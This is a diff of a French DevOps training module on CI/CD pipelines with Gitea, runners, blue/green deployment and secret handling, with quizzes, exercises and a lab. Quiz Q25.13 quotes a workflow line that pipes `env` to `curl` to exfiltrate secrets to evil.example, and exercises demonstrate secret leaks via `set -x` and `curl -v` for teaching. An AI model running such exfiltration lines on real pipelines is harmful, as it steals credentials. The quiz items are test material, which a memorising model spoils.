@@ -1,47 +1,73 @@
+<!-- nav:début -->
+[Accueil](../../README.md) › [Parcours](../../docs/parcours.md) › Partie IV — Socle DevOps › **Module 25**  
+[← Module 24](../24-iac-terraform/README.md) · [Corrigé](corrige.md) · [Module 26 →](../26-kubernetes-observabilite/README.md)
+
+<details><summary>Scripts du module (10)</summary>
+
+Sur la VM indiquée en section « Mise en place », depuis `~/workbook/scripts/` (voir [chapitre 0](../../docs/00-mise-en-place.md)).
+
+| Script | Rôle |
+|---|---|
+| [`setup_M25.sh`](../../scripts/setup/setup_M25.sh) | prépare le module |
+| [`check_M25_01.sh`](../../scripts/check/check_M25_01.sh) | vérification |
+| [`check_M25_02.sh`](../../scripts/check/check_M25_02.sh) | vérification |
+| [`check_M25_03.sh`](../../scripts/check/check_M25_03.sh) | vérification |
+| [`check_M25_04.sh`](../../scripts/check/check_M25_04.sh) | vérification |
+| [`check_M25_05.sh`](../../scripts/check/check_M25_05.sh) | vérification |
+| [`break_M25_01.sh`](../../scripts/break/break_M25_01.sh) | installe une panne |
+| [`break_M25_02.sh`](../../scripts/break/break_M25_02.sh) | installe une panne |
+| [`break_M25_03.sh`](../../scripts/break/break_M25_03.sh) | installe une panne |
+| [`break_M25_04.sh`](../../scripts/break/break_M25_04.sh) | installe une panne |
+
+</details>
+<!-- nav:fin -->
+
 # Module 25 — CI/CD : intégration et déploiement continus
 
 ## 25.0 Objectifs et compétences
 
-::: objectif
-À la fin de ce module, je sais :
-
-* distinguer **intégration continue**, **livraison continue** et
-  **déploiement continu**, et dire à quel moment précis un humain intervient
-  dans chacun des trois ;
-* décrire un pipeline avec le vocabulaire commun à toutes les forges :
-  déclencheur, *stage*, *job*, *step*, *runner*, artefact, cache, matrice,
-  environnement, approbation, secret, *fail fast* ;
-* installer une forge Gitea auto-hébergée (Docker Compose + PostgreSQL) sur
-  `lab-ops`, y enregistrer un **act_runner** avec des labels, et expliquer
-  ce que change « un conteneur par job » par rapport à « shell sur l'hôte »
-  pour l'isolation et les secrets ;
-* écrire un workflow `.gitea/workflows/ci.yaml` complet : `on`, `jobs`,
-  `runs-on`, `steps`, `uses`/`run`, `env`, `secrets`, `needs`, `if`,
-  `matrix`, artefacts, cache, `services`, `timeout-minutes`, `concurrency` ;
-* construire le pipeline d'une application conteneurisée : lint, tests,
-  build d'image taguée par SHA, scan de vulnérabilités, push vers un
-  registre, déploiement par SSH, smoke test, **rollback automatique** ;
-* construire un pipeline d'infrastructure : `ansible-lint` et
-  `--check --diff` en *pull request*, apply au merge ; `tofu plan` en PR,
-  apply sur approbation ;
-* mettre en œuvre un déploiement **blue/green** réel derrière nginx et
-  situer *recreate*, *rolling*, *canary* et *feature flags* ;
-* appliquer « *build once, deploy many* » : images taguées par SHA, tags Git
-  SemVer, promotion d'artefact, changelog ;
-* protéger les secrets d'un pipeline : masquage, fuites par `set -x`,
-  `curl -v` ou encodage, clé SSH de déploiement à commande forcée,
-  rotation, principe de l'OIDC ;
-* diagnostiquer les pannes classiques : job non déclenché, job en attente,
-  permission Docker, artefact absent, cache corrompu, « ça passe en CI mais
-  pas en prod », pipeline lent ;
-* transposer le même pipeline en GitLab CI, GitHub Actions et Jenkins ;
-* citer et calculer les **quatre métriques DORA**.
-
-Temps estimé : 10 h
-Prérequis : module 07 (bash), module 14 (SSH), module 21 (Git), et les
-modules conteneurs (Docker, Compose), Ansible et OpenTofu du workbook. Les
-rappels minimaux nécessaires sont donnés dans le module.
-:::
+> [!NOTE]
+> **Objectifs**
+>
+> À la fin de ce module, je sais :
+>
+> * distinguer **intégration continue**, **livraison continue** et
+>   **déploiement continu**, et dire à quel moment précis un humain intervient
+>   dans chacun des trois ;
+> * décrire un pipeline avec le vocabulaire commun à toutes les forges :
+>   déclencheur, *stage*, *job*, *step*, *runner*, artefact, cache, matrice,
+>   environnement, approbation, secret, *fail fast* ;
+> * installer une forge Gitea auto-hébergée (Docker Compose + PostgreSQL) sur
+>   `lab-ops`, y enregistrer un **act_runner** avec des labels, et expliquer
+>   ce que change « un conteneur par job » par rapport à « shell sur l'hôte »
+>   pour l'isolation et les secrets ;
+> * écrire un workflow `.gitea/workflows/ci.yaml` complet : `on`, `jobs`,
+>   `runs-on`, `steps`, `uses`/`run`, `env`, `secrets`, `needs`, `if`,
+>   `matrix`, artefacts, cache, `services`, `timeout-minutes`, `concurrency` ;
+> * construire le pipeline d'une application conteneurisée : lint, tests,
+>   build d'image taguée par SHA, scan de vulnérabilités, push vers un
+>   registre, déploiement par SSH, smoke test, **rollback automatique** ;
+> * construire un pipeline d'infrastructure : `ansible-lint` et
+>   `--check --diff` en *pull request*, apply au merge ; `tofu plan` en PR,
+>   apply sur approbation ;
+> * mettre en œuvre un déploiement **blue/green** réel derrière nginx et
+>   situer *recreate*, *rolling*, *canary* et *feature flags* ;
+> * appliquer « *build once, deploy many* » : images taguées par SHA, tags Git
+>   SemVer, promotion d'artefact, changelog ;
+> * protéger les secrets d'un pipeline : masquage, fuites par `set -x`,
+>   `curl -v` ou encodage, clé SSH de déploiement à commande forcée,
+>   rotation, principe de l'OIDC ;
+> * diagnostiquer les pannes classiques : job non déclenché, job en attente,
+>   permission Docker, artefact absent, cache corrompu, « ça passe en CI mais
+>   pas en prod », pipeline lent ;
+> * transposer le même pipeline en GitLab CI, GitHub Actions et Jenkins ;
+> * citer et calculer les **quatre métriques DORA**.
+>
+> **Temps estimé** : 10 h
+>
+> **Prérequis** : module 07 (bash), module 14 (SSH), module 21 (Git), et les
+> modules conteneurs (Docker, Compose), Ansible et OpenTofu du workbook. Les
+> rappels minimaux nécessaires sont donnés dans le module.
 
 ---
 
@@ -96,12 +122,13 @@ Registre : `10.10.10.14:5000`, protégé par `htpasswd` (`mathieu` /
 `lab-ops` et pour `deploy` sur `lab-web`. Le runner est enregistré avec le
 label `ubuntu-latest`.
 
-::: attention
-Le runner tourne avec `/var/run/docker.sock` monté : tout job du pipeline
-est de fait **root sur `lab-ops`**. C'est voulu pour le lab (on a besoin de
-construire des images) et c'est exactement le genre de choix qu'on doit
-savoir défendre ou refuser en entreprise — voir QO25.4.
-:::
+> [!CAUTION]
+> **Attention**
+>
+> Le runner tourne avec `/var/run/docker.sock` monté : tout job du pipeline
+> est de fait **root sur `lab-ops`**. C'est voulu pour le lab (on a besoin de
+> construire des images) et c'est exactement le genre de choix qu'on doit
+> savoir défendre ou refuser en entreprise — voir QO25.4.
 
 Vérifie avant d'attaquer :
 
@@ -111,12 +138,13 @@ curl -s http://10.10.10.14:3000/api/healthz
 curl -s -u mathieu:Factura-Reg-2026 http://10.10.10.14:5000/v2/_catalog
 ```
 
-::: rhel
-Ce module tourne entièrement sur Ubuntu (`lab-ops`, `lab-web`). Si tu voulais
-héberger le runner sur `lab-rhel` : `sudo dnf install -y docker-ce` depuis le
-dépôt Docker, `firewall-cmd --add-port=3000/tcp --permanent`, et SELinux
-impose `:z` sur les volumes montés dans le compose.
-:::
+> [!IMPORTANT]
+> **Variante Rocky / RHEL**
+>
+> Ce module tourne entièrement sur Ubuntu (`lab-ops`, `lab-web`). Si tu voulais
+> héberger le runner sur `lab-rhel` : `sudo dnf install -y docker-ce` depuis le
+> dépôt Docker, `firewall-cmd --add-port=3000/tcp --permanent`, et SELinux
+> impose `:z` sur les volumes montés dans le compose.
 
 ---
 
@@ -274,7 +302,9 @@ test ──┘                                                        │ échec
 * Rollback = redéployer l'image précédente, connue et déjà tirée. Pas de
   rebuild.
 
-@fig(cicd-pipeline): Le pipeline de référence : une seule image `:<sha12>` construite, scannée et poussée par le runner de lab-ops, déployée en staging, promue à la main vers la prod en blue/green, rollback sans rebuild.
+<p align="center"><img src="../../assets/figures/cicd-pipeline.svg" alt="Schéma : cicd-pipeline"></p>
+
+*Figure — Le pipeline de référence : une seule image `:<sha12>` construite, scannée et poussée par le runner de lab-ops, déployée en staging, promue à la main vers la prod en blue/green, rollback sans rebuild.*
 
 ### Stratégies de déploiement
 
@@ -290,7 +320,9 @@ l'exécution (config, %, groupe d'utilisateurs). Découple *déployer* de
 *livrer*. Blue/green derrière nginx : deux `upstream`, un `include` qui pointe
 via symlink sur l'un des deux, `nginx -t && systemctl reload nginx`.
 
-@fig(bluegreen): Blue/green derrière nginx : deux upstreams, un symlink de configuration, `nginx -t` puis `reload` ; l'ancienne couleur reste en service, prête pour `back`.
+<p align="center"><img src="../../assets/figures/bluegreen.svg" alt="Schéma : bluegreen"></p>
+
+*Figure — Blue/green derrière nginx : deux upstreams, un symlink de configuration, `nginx -t` puis `reload` ; l'ancienne couleur reste en service, prête pour `back`.*
 
 ### Secrets : les cinq fuites qui reviennent
 
@@ -340,7 +372,7 @@ autres.
 
 ## 25.3 Quiz — QCM
 
-**Q25.1** — Une équipe déploie en production dès qu'un pipeline est vert, sans
+<a id="q25-1"></a>**[Q25.1](corrige.md#q25-1)** — Une équipe déploie en production dès qu'un pipeline est vert, sans
 intervention humaine. Un manager déclare qu'ils « font de la livraison
 continue ». Que fait réellement l'équipe ?
 
@@ -349,7 +381,7 @@ b) de la livraison continue, le terme est exact
 c) du déploiement continu, qui inclut la livraison continue
 d) rien de tout cela sans revue manuelle
 
-**Q25.2** — Ce workflow Gitea ne produit **aucun run** après un `git push`
+<a id="q25-2"></a>**[Q25.2](corrige.md#q25-2)** — Ce workflow Gitea ne produit **aucun run** après un `git push`
 sur `main`. Quelle est la cause la plus probable ?
 
 ```yaml
@@ -369,7 +401,7 @@ b) le fichier est invalide : `runs-on` n'est pas indenté sous `test`
 c) `echo ok` n'est pas une commande autorisée
 d) il manque `workflow_dispatch`
 
-**Q25.3** — Un job `runs-on: ubuntu-22.04` reste à l'état `waiting` depuis
+<a id="q25-3"></a>**[Q25.3](corrige.md#q25-3)** — Un job `runs-on: ubuntu-22.04` reste à l'état `waiting` depuis
 20 minutes. Le runner est en ligne et exécute d'autres jobs. Pourquoi ?
 
 a) le runner n'a pas de label `ubuntu-22.04`
@@ -377,7 +409,7 @@ b) le job attend une approbation
 c) le dépôt est privé
 d) le cache est verrouillé par un autre job
 
-**Q25.4** — Dans `act_runner`, le label
+<a id="q25-4"></a>**[Q25.4](corrige.md#q25-4)** — Dans `act_runner`, le label
 `ubuntu-latest:docker://docker.gitea.com/runner-images:ubuntu-latest` et
 le label `ops:host` diffèrent par… **Deux réponses correctes.**
 
@@ -387,7 +419,7 @@ b) `docker://` démarre un conteneur neuf par job, `host` utilise le shell du
 c) avec `host`, ce qu'un job installe reste disponible pour le suivant
 d) avec `docker://`, le job n'a jamais accès à Docker
 
-**Q25.5** — Quel step **expose** le secret dans les journaux, même avec
+<a id="q25-5"></a>**[Q25.5](corrige.md#q25-5)** — Quel step **expose** le secret dans les journaux, même avec
 masquage actif ? **Deux réponses correctes.**
 
 a) `run: curl -u "admin:$REG_PASS" http://r/v2/` avec
@@ -397,7 +429,7 @@ b) `run: set -x; auth=$(printf 'admin:%s' "$REG_PASS" | base64);`
 c) `run: curl -v -u "admin:$REG_PASS" http://r/v2/`
 d) `run: echo "longueur : ${#REG_PASS}"`
 
-**Q25.6** — Le job `deploy` a `needs: build` et `if: failure()` sur son step
+<a id="q25-6"></a>**[Q25.6](corrige.md#q25-6)** — Le job `deploy` a `needs: build` et `if: failure()` sur son step
 `rollback`. Le job `build` échoue. Que se passe-t-il pour `deploy` ?
 
 a) il s'exécute et lance `rollback`
@@ -405,7 +437,7 @@ b) il est sauté entièrement : `failure()` porte sur les steps du job courant
 c) il s'exécute mais tous ses steps sont ignorés
 d) il échoue avec le même code que `build`
 
-**Q25.7** — Ton pipeline construit `factura:latest`, le pousse, et
+<a id="q25-7"></a>**[Q25.7](corrige.md#q25-7)** — Ton pipeline construit `factura:latest`, le pousse, et
 `lab-web` fait `docker compose pull & up -d`. Un jour, la prod tourne avec
 une version vieille de trois jours alors que le pipeline est vert. Cause la
 plus plausible ?
@@ -416,7 +448,7 @@ b) une autre source a poussé `latest` entre-temps : le tag est un pointeur
 c) le registre a un cache de 72 h
 d) Docker refuse de tirer une image de moins d'une heure
 
-**Q25.8** — Sortie de `docker compose ps` sur `lab-ops` :
+<a id="q25-8"></a>**[Q25.8](corrige.md#q25-8)** — Sortie de `docker compose ps` sur `lab-ops` :
 
 ```text
 NAME      IMAGE                         STATUS
@@ -435,7 +467,7 @@ b) le runner n'est pas sur le même réseau Docker que `gitea`, le nom n'est
 c) le jeton d'enregistrement a expiré
 d) PostgreSQL bloque les connexions
 
-**Q25.9** — Les quatre métriques DORA sont :
+<a id="q25-9"></a>**[Q25.9](corrige.md#q25-9)** — Les quatre métriques DORA sont :
 
 a) couverture de tests, dette technique, vélocité, bugs ouverts
 b) fréquence de déploiement, délai de mise en production, taux d'échec des
@@ -443,14 +475,14 @@ b) fréquence de déploiement, délai de mise en production, taux d'échec des
 c) disponibilité, latence, trafic, saturation
 d) MTBF, MTTR, RPO, RTO
 
-**Q25.10** — « *Build once, deploy many* » interdit précisément…
+<a id="q25-10"></a>**[Q25.10](corrige.md#q25-10)** — « *Build once, deploy many* » interdit précisément…
 
 a) de déployer la même image sur deux environnements
 b) de reconstruire l'artefact entre la recette et la production
 c) d'avoir plus d'un job de build dans le pipeline
 d) d'utiliser des tags Git
 
-**Q25.11** — Un `actions/cache@v4` avec `key: pip-cache` (clé fixe)
+<a id="q25-11"></a>**[Q25.11](corrige.md#q25-11)** — Un `actions/cache@v4` avec `key: pip-cache` (clé fixe)
 restaure un cache à chaque job. Après mise à jour de `requirements.txt`, les
 tests échouent sur un module manquant en CI mais passent en local.
 Explication ?
@@ -461,7 +493,7 @@ b) `actions/cache` ne fonctionne pas avec Python
 c) il faut vider le cache à la main après chaque commit
 d) `hashFiles` est obligatoire syntaxiquement
 
-**Q25.12** — Blue/green derrière nginx : la bascule se fait par
+<a id="q25-12"></a>**[Q25.12](corrige.md#q25-12)** — Blue/green derrière nginx : la bascule se fait par
 `ln -sfn factura-green.conf factura-upstream.conf` puis…
 
 a) `systemctl restart nginx` — obligatoire pour relire un symlink
@@ -470,7 +502,7 @@ b) `nginx -t && systemctl reload nginx` — le test évite de couper le service
 c) rien, nginx surveille les fichiers
 d) `nginx -s stop && nginx`
 
-**Q25.13** — Une PR venant d'un fork modifie `.gitea/workflows/ci.yaml`
+<a id="q25-13"></a>**[Q25.13](corrige.md#q25-13)** — Une PR venant d'un fork modifie `.gitea/workflows/ci.yaml`
 pour y ajouter `run: env | curl -X POST -d @- https://evil.example`. Quel
 mécanisme protège **réellement** ?
 
@@ -480,7 +512,7 @@ b) la forge n'expose pas les secrets aux workflows de PR issues de forks
 c) `timeout-minutes`
 d) le fait que le runner soit dans un conteneur
 
-**Q25.14** — `tofu plan` tourne sur chaque PR, `tofu apply` seulement après
+<a id="q25-14"></a>**[Q25.14](corrige.md#q25-14)** — `tofu plan` tourne sur chaque PR, `tofu apply` seulement après
 approbation. Sur Gitea (pas d'`environment` avec reviewers), comment
 implémenter proprement l'approbation ? **Deux réponses correctes.**
 
@@ -491,7 +523,7 @@ c) protection de branche `main` avec revue obligatoire, apply sur `push`
    vers `main` uniquement
 d) `sleep 600` pour laisser le temps de relire
 
-**Q25.15** — Le step suivant échoue avec `Cannot connect to the Docker daemon
+<a id="q25-15"></a>**[Q25.15](corrige.md#q25-15)** — Le step suivant échoue avec `Cannot connect to the Docker daemon
 at unix:///var/run/docker.sock`. Le runner est en Docker avec le socket
 monté. Cause probable ?
 
@@ -510,7 +542,7 @@ b) le socket est monté mais `docker_host` vaut `"-"` dans `config.yaml`, ou
 c) il faut `privileged: true`
 d) un `container:` ne peut jamais accéder à Docker
 
-**Q25.16** — Version courante `2.3.7`. Tu ajoutes un endpoint `/factures/<id>`
+<a id="q25-16"></a>**[Q25.16](corrige.md#q25-16)** — Version courante `2.3.7`. Tu ajoutes un endpoint `/factures/<id>`
 sans casser l'existant et corriges un bug. Prochain tag SemVer ?
 
 a) `2.3.8`
@@ -518,7 +550,7 @@ b) `2.4.0`
 c) `3.0.0`
 d) `2.4.1`
 
-**Q25.17** — Quel changement réduit le plus le temps d'un pipeline de
+<a id="q25-17"></a>**[Q25.17](corrige.md#q25-17)** — Quel changement réduit le plus le temps d'un pipeline de
 9 minutes dont 6 sont passées dans `apt-get install` répété par 4 jobs ?
 
 a) `timeout-minutes: 5`
@@ -527,7 +559,7 @@ b) une image de runner (ou `container:`) contenant déjà les outils, ou un
 c) `fail-fast: false`
 d) passer de `docker://` à `host`
 
-**Q25.18** — Un workflow a `concurrency: { group: deploy-prod,
+<a id="q25-18"></a>**[Q25.18](corrige.md#q25-18)** — Un workflow a `concurrency: { group: deploy-prod,
 cancel-in-progress: true }` sur le job de déploiement. Deux pushes rapides
 sur `main`. Conséquence ?
 
@@ -541,96 +573,76 @@ d) le second est refusé définitivement
 
 ## 25.4 Quiz — questions ouvertes
 
-**QO25.1** — Définis CI, livraison continue et déploiement continu en
+<a id="qo25-1"></a>**[QO25.1](corrige.md#qo25-1)** — Définis CI, livraison continue et déploiement continu en
 précisant, pour chacun, **quel artefact** existe à la fin et **qui** décide
 de la mise en production. Donne un exemple d'équipe pour laquelle le
 déploiement continu serait une erreur, et pourquoi.
 
-::: repondre
-lignes: 8
-:::
+<!-- repondre: 8 -->
 
-**QO25.2** — *On te demande en entretien* : « Décris le pipeline que tu
+<a id="qo25-2"></a>**[QO25.2](corrige.md#qo25-2)** — *On te demande en entretien* : « Décris le pipeline que tu
 mettrais en place pour une application conteneurisée, du commit à la
 production, en justifiant l'ordre des étapes et en disant ce qui bloque le
 pipeline à chaque étape. » Réponds en 10 lignes, sans citer d'outil précis
 avant la fin.
 
-::: repondre
-lignes: 10
-:::
+<!-- repondre: 10 -->
 
-**QO25.3** — Explique le mécanisme par lequel un secret « masqué » finit
+<a id="qo25-3"></a>**[QO25.3](corrige.md#qo25-3)** — Explique le mécanisme par lequel un secret « masqué » finit
 quand même dans un journal de pipeline. Cite trois vecteurs différents, et
 pour chacun la contre-mesure. Pourquoi `env:` est-il préférable à `${{ }}`
 directement dans `run:` ?
 
-::: repondre
-lignes: 8
-:::
+<!-- repondre: 8 -->
 
-**QO25.4** — Sur `lab-ops`, le runner monte `/var/run/docker.sock` dans
+<a id="qo25-4"></a>**[QO25.4](corrige.md#qo25-4)** — Sur `lab-ops`, le runner monte `/var/run/docker.sock` dans
 chaque job. Explique ce qu'un job peut faire avec ce socket, pourquoi c'est
 équivalent à root sur l'hôte, et décris deux architectures qui permettent de
 construire des images **sans** ce montage. Quel compromis retiens-tu pour une
 PME de 15 développeurs ?
 
-::: repondre
-lignes: 8
-:::
+<!-- repondre: 8 -->
 
-**QO25.5** — Compare blue/green et canary : infrastructure requise, ce qu'on
+<a id="qo25-5"></a>**[QO25.5](corrige.md#qo25-5)** — Compare blue/green et canary : infrastructure requise, ce qu'on
 mesure avant de basculer, ce qu'il advient de l'état (sessions, base de
 données) et le cas où chacune est inapplicable. Où se placent les *feature
 flags* par rapport à ces deux stratégies ?
 
-::: repondre
-lignes: 8
-:::
+<!-- repondre: 8 -->
 
-**QO25.6** — *On te demande en entretien* : « Le pipeline est vert, la prod
+<a id="qo25-6"></a>**[QO25.6](corrige.md#qo25-6)** — *On te demande en entretien* : « Le pipeline est vert, la prod
 est cassée. Comment tu enquêtes ? » Donne ta démarche ordonnée : ce que tu
 compares, les commandes sur `lab-web` et sur le registre, et les trois causes
 qui expliquent 90 % des cas.
 
-::: repondre
-lignes: 10
-:::
+<!-- repondre: 10 -->
 
-**QO25.7** — Explique « *build once, deploy many* » en décrivant ce qu'est une
+<a id="qo25-7"></a>**[QO25.7](corrige.md#qo25-7)** — Explique « *build once, deploy many* » en décrivant ce qu'est une
 **promotion** d'artefact et pourquoi une image taguée uniquement par un
 numéro de version Git ne suffit pas. Que faut-il faire du tag `latest` ?
 
-::: repondre
-lignes: 6
-:::
+<!-- repondre: 6 -->
 
-**QO25.8** — Un job `tofu apply` doit attendre une approbation humaine. Décris
+<a id="qo25-8"></a>**[QO25.8](corrige.md#qo25-8)** — Un job `tofu apply` doit attendre une approbation humaine. Décris
 comment tu l'obtiens sur GitLab CI, sur GitHub Actions et sur Gitea Actions,
 en pointant ce qui est natif et ce qui est contourné. Quel risque spécifique
 introduit le contournement ?
 
-::: repondre
-lignes: 8
-:::
+<!-- repondre: 8 -->
 
-**QO25.9** — Un runner « éphémère » : qu'est-ce que c'est, quel problème
+<a id="qo25-9"></a>**[QO25.9](corrige.md#qo25-9)** — Un runner « éphémère » : qu'est-ce que c'est, quel problème
 résout-il (cite un incident concret qu'il évite), et quel coût introduit-il ?
 Comment gères-tu le disque d'un runner persistant qui construit 40 images
 par jour ?
 
-::: repondre
-lignes: 6
-:::
+<!-- repondre: 6 -->
 
-**QO25.10** — Donne une définition opérationnelle des quatre métriques DORA
+<a id="qo25-10"></a>**[QO25.10](corrige.md#qo25-10)** — Donne une définition opérationnelle des quatre métriques DORA
 (quelle donnée brute, où la trouver dans Gitea/Git/les logs de déploiement)
 et explique pourquoi optimiser les deux premières sans surveiller les deux
 dernières est une erreur classique.
 
-::: repondre
-lignes: 8
-:::
+<!-- repondre: 8 -->
 
 ---
 
@@ -640,53 +652,53 @@ Sauf mention contraire, tu travailles sur `lab-ops`, dans `~/lab25`. Chaque
 workflow que tu écris doit passer `yamllint` (avec la règle `truthy`
 désactivée pour la clé `on`).
 
-**E25.1** — Inspecte la forge livrée par le setup : liste les conteneurs et
+<a id="e25-1"></a>**[E25.1](corrige.md#e25-1)** — Inspecte la forge livrée par le setup : liste les conteneurs et
 leurs ports publiés, trouve dans `~/lab25/forge/compose.yaml` la variable
 qui active Gitea Actions, celle qui saute l'installateur web, et le montage
 qui donne à `act_runner` accès à Docker. Note le nom du volume où le runner
 garde son enregistrement (`.runner`).
 
-**E25.2** — Avec l'API et ton jeton (`~/lab25/.gitea-token`), affiche la
+<a id="e25-2"></a>**[E25.2](corrige.md#e25-2)** — Avec l'API et ton jeton (`~/lab25/.gitea-token`), affiche la
 liste de tes dépôts, puis le contenu de `~/lab25/factura/README.md` tel que
 Gitea le sert. Enregistre ensuite un *credential helper* Git de type `store`
 dans un fichier de `~/lab25/` pour ne plus taper le jeton, et vérifie par un
 `git push` à vide.
 
-**E25.3** — Écris `.gitea/workflows/hello.yaml` dans `factura` : déclenché
+<a id="e25-3"></a>**[E25.3](corrige.md#e25-3)** — Écris `.gitea/workflows/hello.yaml` dans `factura` : déclenché
 sur `push` **et** manuellement, un job qui affiche `gitea.sha`,
 `gitea.ref`, `gitea.actor`, `gitea.event_name` et les variables
 `GITHUB_SHA`, `GITHUB_REF_NAME`, `GITHUB_WORKSPACE`. Pousse, observe le run,
 puis déclenche-le à la main depuis l'interface. Note ce qui diffère entre les
 deux exécutions.
 
-**E25.4** — Ajoute au même workflow une **matrice** `python: ["3.11",
+<a id="e25-4"></a>**[E25.4](corrige.md#e25-4)** — Ajoute au même workflow une **matrice** `python: ["3.11",
 "3.12"]` avec `container: image: python:${{ matrix.python }}-slim` qui
 lance `pytest -q`. Le premier `pytest` doit échouer sur un import : installe
 les dépendances. Fais ensuite volontairement échouer 3.11 (par exemple avec
 `if: matrix.python == '3.11'` sur un `exit 1`) et observe l'effet de
 `fail-fast: true` puis `false` sur l'autre job.
 
-**E25.5** — Crée deux jobs `a` et `b` sans lien, puis un job `c` avec
+<a id="e25-5"></a>**[E25.5](corrige.md#e25-5)** — Crée deux jobs `a` et `b` sans lien, puis un job `c` avec
 `needs: [a, b]`. Dans `a`, produis une sortie `version` via `$GITHUB_OUTPUT`
 et affiche-la dans `c`. Mesure la durée totale du run avec et sans `needs`
 entre `a` et `b`, et explique la différence.
 
-**E25.6** — Fais produire à un job un fichier `rapport.txt` et publie-le en
+<a id="e25-6"></a>**[E25.6](corrige.md#e25-6)** — Fais produire à un job un fichier `rapport.txt` et publie-le en
 artefact ; télécharge-le dans un second job avec `actions/download-artifact@v4`
 et affiche-le. Puis casse volontairement : renomme le fichier sans changer
 `path`. Note le message exact de l'échec et le job qui le remonte.
 
-**E25.7** — Ajoute un cache `pip` avec `actions/cache@v4` et une clé
+<a id="e25-7"></a>**[E25.7](corrige.md#e25-7)** — Ajoute un cache `pip` avec `actions/cache@v4` et une clé
 construite sur `hashFiles('requirements*.txt')`. Lance deux fois : le
 premier run doit afficher `Cache not found`, le second `Cache restored`.
 Modifie `requirements-dev.txt` et prouve que la clé change.
 
-**E25.8** — Ajoute un `services:` PostgreSQL 16 à un job dans
+<a id="e25-8"></a>**[E25.8](corrige.md#e25-8)** — Ajoute un `services:` PostgreSQL 16 à un job dans
 `container: python:3.12-slim` et prouve, avec `pg_isready -h db` ou un
 `psql`, que le service est joignable par son nom. Que se passe-t-il si tu
 retires `container:` (job directement dans l'image du runner) ?
 
-**E25.9** — Crée, via l'API Gitea (`PUT
+<a id="e25-9"></a>**[E25.9](corrige.md#e25-9)** — Crée, via l'API Gitea (`PUT
 /api/v1/repos/mathieu/factura/actions/secrets/<NOM>`), un secret
 `DEMO_SECRET` de valeur `s3cr3t-lab25`. Écris un step qui l'utilise par
 `env:` et affiche `longueur = N`. Puis, dans un step séparé, tente
@@ -694,7 +706,7 @@ retires `container:` (job directement dans l'image du runner) ?
 `set -x; curl -u "u:$DEMO_SECRET" http://10.10.10.14:5000/v2/`. Note
 précisément ce que le journal montre pour chacun.
 
-**E25.10** — Depuis `~/lab25/factura`, sans pipeline (le setup a déjà fait
+<a id="e25-10"></a>**[E25.10](corrige.md#e25-10)** — Depuis `~/lab25/factura`, sans pipeline (le setup a déjà fait
 le `docker login` ; l'API du registre, elle, attend `-u`) : construis
 l'image avec
 `--build-arg APP_VERSION=$(git rev-parse --short=12 HEAD)`, tague-la
@@ -704,32 +716,32 @@ par `docker inspect` avec celui renvoyé par
 `curl -I` sur le manifest, en annonçant les deux types de manifest acceptés (`Accept:` OCI `image.manifest.v1+json` et Docker `distribution.`
 manifest.`v2+json`).
 
-**E25.11** — Scanne cette image avec `trivy` (image
+<a id="e25-11"></a>**[E25.11](corrige.md#e25-11)** — Scanne cette image avec `trivy` (image
 `aquasec/trivy`) en mode `--exit-code 1 --severity CRITICAL`. Lis le rapport
 et trouve combien de vulnérabilités sont `HIGH` mais sans correctif
 (`--ignore-unfixed` les retire). Justifie en deux lignes le seuil que tu
 retiendrais pour bloquer un pipeline.
 
-**E25.12** — Sur `lab-web`, installe la clé publique
+<a id="e25-12"></a>**[E25.12](corrige.md#e25-12)** — Sur `lab-web`, installe la clé publique
 `~/lab25/keys/deploy.pub` (copie-la depuis `lab-ops`) pour l'utilisateur
 `deploy` avec une **commande forcée** `/usr/local/bin/factura-deploy` et
 `from="10.10.10.14"`. Depuis `lab-ops`, prouve que
 `ssh -i ~/lab25/keys/deploy deploy@10.10.10.11 id` n'exécute **pas** `id`
 et que `SSH_ORIGINAL_COMMAND` contient bien `id`.
 
-**E25.13** — Installe un second runner **natif** sur `lab-ops` (binaire
+<a id="e25-13"></a>**[E25.13](corrige.md#e25-13)** — Installe un second runner **natif** sur `lab-ops` (binaire
 `act_runner` depuis `https://dl.gitea.com/act_runner/`, service systemd,
 utilisateur dédié `runner`) avec le seul label `lab-shell:host`. Écris un job
 `runs-on: lab-shell` qui affiche `id`, `hostname` et `pwd`, et compare avec
 le même job sur `ubuntu-latest`. Où sont les fichiers du workspace dans
 chaque cas ?
 
-**E25.14** — Pose un tag Git `v0.1.0` sur `main` de `factura` et pousse-le.
+<a id="e25-14"></a>**[E25.14](corrige.md#e25-14)** — Pose un tag Git `v0.1.0` sur `main` de `factura` et pousse-le.
 Écris la condition de step qui ne pousse le tag d'image `v0.1.0` **que** si
 `gitea.ref` commence par `refs/tags/v`, et vérifie dans le registre que
 l'image porte alors deux tags pointant sur le **même digest**.
 
-**E25.15** — Écris `~/lab25/rapports/dora.sh` qui calcule, à partir de
+<a id="e25-15"></a>**[E25.15](corrige.md#e25-15)** — Écris `~/lab25/rapports/dora.sh` qui calcule, à partir de
 `git log` de `factura` et d'un fichier `~/lab25/rapports/deploiements.log`
 (une ligne `date;sha;resultat` par déploiement, fourni par le setup), la
 fréquence de déploiement sur 30 jours, le *lead time* médian et le taux
@@ -739,15 +751,15 @@ d'échec. Le MTTR se déduit des lignes `resultat=ko` suivies d'un `ok`.
 
 ## 25.6 Labs ★★
 
-### **L25.1** — La forge : Gitea, runner, premier pipeline vert
+### <a id="l25-1"></a>**[L25.1](corrige.md#l25-1)** — La forge : Gitea, runner, premier pipeline vert
 
-::: contexte
-La PME a hébergé son code chez un prestataire qui ferme. On te confie
-l'auto-hébergement : une forge Gitea sur `lab-ops`, un runner, un registre.
-Le setup a posé les conteneurs ; à toi de comprendre la configuration,
-d'ajouter un second label au runner, de protéger `main` et de livrer un
-premier pipeline qui lint et teste `factura` sur chaque push.
-:::
+> **Contexte**
+>
+> La PME a hébergé son code chez un prestataire qui ferme. On te confie
+> l'auto-hébergement : une forge Gitea sur `lab-ops`, un runner, un registre.
+> Le setup a posé les conteneurs ; à toi de comprendre la configuration,
+> d'ajouter un second label au runner, de protéger `main` et de livrer un
+> premier pipeline qui lint et teste `factura` sur chaque push.
 
 1. Lis `~/lab25/forge/compose.yaml` et `~/lab25/forge/runner/config.yaml`.
    Dans un fichier `~/lab25/rapports/forge.md`, documente : pourquoi
@@ -777,27 +789,28 @@ premier pipeline qui lint et teste `factura` sur chaque push.
    causes (pas les vérifications), sur une branche `fix/ci`, ouvre une PR,
    observe le pipeline sur la PR, merge.
 
-::: check
-Critère de succès : un run `ci` vert sur `main` avec les jobs `lint` et
-`test`, un artefact `rapport-tests` téléchargeable, `main` protégée, runner
-`Idle` avec `capacity: 2`.
-
-```bash
-bash check_M25_01.sh
-```
-:::
+> [!TIP]
+> **Critère de succès**
+>
